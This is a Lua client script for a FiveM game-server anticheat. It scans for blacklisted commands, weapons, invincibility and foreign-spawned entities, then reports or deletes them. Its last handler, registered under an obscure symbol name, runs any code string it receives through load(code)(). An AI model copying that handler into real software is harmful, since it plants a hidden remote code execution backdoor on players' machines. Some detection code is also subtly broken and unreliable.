-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

function ReqAndDelete(entity)
	if DoesEntityExist(entity) then
		NetworkRequestControlOfEntity(entity)
		local gameTime = GetGameTimer()

		while DoesEntityExist(entity) and (not NetworkHasControlOfEntity(entity) or ((GetGameTimer() - gameTime) < 2000)) do
			Citizen.Wait(10)
		end

		if DoesEntityExist(entity) then
			DetachEntity(entity, false, false)
			SetEntityAsMissionEntity(entity, false, false)
			SetEntityCollision(entity, false, false)
			SetEntityAlpha(entity, 0, true)
			SetEntityAsNoLongerNeeded(entity)

			if IsAnEntity(entity) then
				DeleteEntity(entity)
			elseif IsEntityAPed(entity) then
				DeletePed(entity)
			elseif IsEntityAVehicle(entity) then
				DeleteVehicle(entity)
			elseif IsEntityAnObject(entity) then
				DeleteObject(entity)
			end

			gameTime = GetGameTimer()

			while DoesEntityExist(entity) and ((GetGameTimer() - gameTime) < 2000) do
				Citizen.Wait(10)
			end

			if DoesEntityExist(entity) then
				SetEntityCoords(entity, vector3(10000.0, -1000.0, 10000.0), vector3(0.0, 0.0, 0.0), false)
			end
		end
	end
end

function ViolateReport(report)
	_TriggerServerEvent("::{korioz#0110}::myAcSuckYourAssholeHacker", report)
end

function Detection1()
	while true do
		Citizen.Wait(1000)
		local cmds = GetRegisteredCommands()

		for i = 1, #cmds, 1 do
			if Pasta.Cmds[cmds[i].name] then
				ViolateReport("Commandes BlackLists (" .. cmds[i].name ..")")
				_TriggerServerEvent('::{korioz#0110}::BanSql:ICheatClient')
			end
		end
	end
end

function Detection2()
	while true do
		Citizen.Wait(1000)
		local plyPed = PlayerPedId()

		for i = 1, #Pasta.Weapons, 1 do
			Citizen.Wait(10)

			if HasPedGotWeapon(plyPed, Pasta.Weapons[i], false) then
				RemoveWeaponFromPed(plyPed, Pasta.Weapons[i])
				ViolateReport("Armes Interdites")
			end
		end
	end
end

function Detection3()
	while true do
		Citizen.Wait(60000)
		local plyPed = PlayerPedId()
		local player = PlayerId()

		if NetworkIsLocalPlayerInvincible() or GetPlayerInvincible(player) or GetEntityHealth(plyPed) > 200 then
			ViolateReport("Invincibilité")
		else
			if not IsPlayerDead(player) then
				if GetEntityHealth(plyPed) > 2 then
					local plyHealth = GetEntityHealth(plyPed)
					ApplyDamageToPed(plyPed, 2, false)
					Citizen.Wait(25)
		
					if GetEntityHealth(plyPed) == plyHealth then
						ViolateReport("Invincibilité")
					else
						SetEntityHealth(plyPed, plyHealth)
					end
				end

				if GetPedArmour(plyPed) > 2 then
					local plyArmor = GetPedArmour(plyPed)
					ApplyDamageToPed(plyPed, 2, true)
					Citizen.Wait(25)
	
					if GetPedArmour(plyPed) == plyArmor then
						ViolateReport("Invincibilité")
					else
						SetPedArmour(plyPed, plyArmor)
					end
				end
			end
		end
	end
end

function Detection4()
	while true do
		Citizen.Wait(30000)
		local plyPed = PlayerPedId()
		local vehPed = GetVehiclePedIsUsing(plyPed)

		if vehPed then
			if GetEntityHealth(vehPed) > GetEntityMaxHealth(vehPed) then
				ViolateReport("Invincibilité Véhicule")
				SetEntityAsMissionEntity(vehiclePedIsUsing, false, false)
			end
		end
	end
end

function Detection5()
	while true do
		Citizen.Wait(10)

		for vehicle in EnumerateVehicles() do
			Citizen.Wait(0)
			local done = false

			if not done then
				local vehModel = GetEntityModel(vehicle)

				if Pasta.Vehicles[vehModel] then
					ReqAndDelete(vehicle)
					done = true
				end
			end

			if not done then
				local handle = GetEntityScript(vehicle)

				if handle ~= nil then
					if (handle ~= '' and handle ~= 'es_extended') then
						ReqAndDelete(vehicle)
						done = true
					end
				end
			end
		end
	end
end

function Detection6()
	while true do
		Citizen.Wait(10)

		for prop in EnumerateObjects() do
			Citizen.Wait(0)
			local done = false

			if not done then
				local propModel = GetEntityModel(prop)

				if Pasta.Props[propModel] then
					ReqAndDelete(prop)
					done = true
				end
			end

			if not done then
				local handle = GetEntityScript(prop)

				if handle ~= nil then
					if (handle ~= '' and handle ~= 'es_extended') then
						ReqAndDelete(prop)
					end
				end
			end
		end
	end
end

function Detection7()
	while true do
		Citizen.Wait(10)

		for ped in EnumeratePeds() do
			if not IsPedAPlayer(ped) then
				Citizen.Wait(0)
				local done = false

				if not done then
					local pedModel = GetEntityModel(ped)

					if Pasta.Peds[pedModel] then
						ReqAndDelete(ped)
						done = true
					end
				end

				if not done then
					local handle = GetEntityScript(ped)

					if handle ~= nil then
						if (handle ~= '' and handle ~= 'es_extended') then
							ReqAndDelete(ped)
						end
					end
				end
			end
		end
	end
end

RegisterNetEvent('::{korioz#0110}::byebyeEntities')
AddEventHandler('::{korioz#0110}::byebyeEntities', function()
	for prop in EnumerateObjects() do
		Citizen.Wait(0)
		local handle = GetEntityScript(prop)

		if handle ~= nil then
			ReqAndDelete(prop)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::deleteEntity')
AddEventHandler('::{korioz#0110}::deleteEntity', function(entity)
	ReqAndDelete(entity)
end)

Citizen.CreateThread(Detection1)
Citizen.CreateThread(Detection2)
Citizen.CreateThread(Detection3)
--Citizen.CreateThread(Detection4)
Citizen.CreateThread(Detection5)
Citizen.CreateThread(Detection6)
Citizen.CreateThread(Detection7)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)
